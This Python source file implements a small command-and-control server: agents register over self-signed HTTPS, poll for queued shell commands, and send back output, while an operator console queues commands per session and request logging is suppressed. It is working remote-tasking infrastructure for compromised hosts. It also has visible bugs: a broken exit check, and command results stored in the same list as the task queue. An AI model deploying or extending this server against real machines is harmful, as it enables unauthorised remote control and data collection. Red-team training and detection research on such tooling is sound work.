import ssl
import json
import threading
import os
from urllib.parse import urlparse, parse_qs
import uuid
import http.server

HOST = "127.0.0.1"
PORT = 4443
CERT_FILE = "server.pem"

# Global dictionary to store agents and their tasks
agents = {}

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        query = parse_qs(parsed_url.query)

        if path == '/register':
            session_id = self.register_agent()
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(session_id.encode('utf-8'))
        elif path.startswith('/task/'):
            session_id = path.split('/')[2]
            task = self.get_command(session_id)
            if task:
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(task.encode('utf-8'))
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write("None".encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        parsed_url = urlparse(self.path)
        path = parsed_url.path

        if path.startswith('/results/'):
            session_id = path.split('/')[2]
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            command = data.get('command')
            output = data.get('output')
            if command and output:
                print(f"Received output for session {session_id}: {command}")
                print(output)

                self.store_output(session_id, command, output)
                self.send_response(200)
                self.end_headers()
            else:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def register_agent(self):
        # Generate a unique session ID
        session_id = str(uuid.uuid4())[:8]
        agents[session_id] = []
        print(f"New session established: {session_id}")
        return session_id

    def get_command(self, session_id):
        if session_id in agents and agents[session_id]:
            command = agents[session_id].pop(0)
            if isinstance(command, str):
                return command
            else:
                return None
        return None 

    def store_output(self, session_id, command, output):
        if session_id in agents:
            if not isinstance(agents[session_id], list):
                agents[session_id] = []
            agents[session_id].append((command, output))

    def log_message(self, format, *args):
        return  # Suppress logging

def generate_certificate(cert_file):
    # Check if certificate file exists
    if not os.path.exists(cert_file):
        # Generate a self-signed certificate
        os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {cert_file} -out {cert_file} -days 365 -nodes -subj '/CN=localhost'")

def cmd_loop():
    session_id = ""
    while True:
        if not session_id:
            session_id = input("Enter session ID: ").strip()
            if session_id in agents:
                print(f"Session {session_id} started")
            else:
                print(f"Session ID {session_id} not found. Please enter a valid session ID.")
                session_id = ""
                continue

        command = input(f"Session {session_id} > ").strip()

        if command.lower() == "exit":
            if agents.__len__ == 0:
                print("No active sessions. Exiting...")
                break

        if session_id in agents:
            agents[session_id].append(command)
        else:
            print(f"Session ID {session_id} not found. Please enter a valid session ID.")
            session_id = ""

# Function to start the HTTP server in a thread
def start_http_server():
    generate_certificate(CERT_FILE)

    # Clear tasks and agents
    agents.clear()

    # Create SSL context
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(CERT_FILE)

    # Create HTTP server with SSL
    server_address = (HOST, PORT)
    httpd = http.server.HTTPServer(server_address, RequestHandler)
    httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)

    print(f"Server started at https://{HOST}:{PORT}")

    # Start the HTTP server
    httpd.serve_forever()

def main():
    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=start_http_server)
    server_thread.start()    
    cmd_loop()

if __name__ == "__main__":
    main()
